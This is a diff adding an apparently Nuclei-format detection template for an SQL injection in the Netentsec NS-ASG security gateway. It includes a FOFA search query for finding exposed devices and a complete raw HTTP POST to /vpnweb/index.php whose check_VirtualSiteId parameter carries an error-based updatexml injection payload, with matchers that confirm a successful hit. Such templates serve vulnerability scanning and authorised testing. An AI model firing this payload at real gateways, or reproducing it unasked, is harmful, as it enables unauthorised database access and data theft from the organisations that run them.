@@ -1,0 +1,33 @@
+id: netentsec-ns-asg-sqli
+
+info:
+  name: 网康应用安全网关（NS ASG）SQL注入漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: title:"网康-NS-ASG-应用安全网关"
+      该系统在处理特定请求参数时存在SQL语法解析缺陷，攻击者可通过构造恶意负载执行非授权数据库操作。此漏洞可能导致敏感数据泄露、数据完整性受损或系统权限提升。受影响组件需结合具体请求路径与参数验证逻辑进行确认。
+  tags: 网康应用安全网关
+
+http:
+- raw:
+  - |
+    POST /vpnweb/index.php?para=index HTTP/1.1
+    Host: {{Hostname}}
+    sec-ch-ua: "Chromium";v="109", "Not_A Brand";v="99"
+    Accept: application/json, text/javascript, */*; q=0.01
+    Content-Type: application/x-www-form-urlencoded
+    X-Requested-With: XMLHttpRequest
+    Accept-Encoding: gzip, deflate
+    Accept-Language: zh-CN,zh;q=0.9
+    Connection: close
+
+    check_username=123&check_username1=123&check_passwd=123&action=login_check&check_VirtualSiteId=1/**/and/**/updatexml(1,concat(0x7e,(md5(123))),3)#&imgcode=undefined&selvalue=2&BackgroundName=background.gif
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - '202cb962ac59075b9'
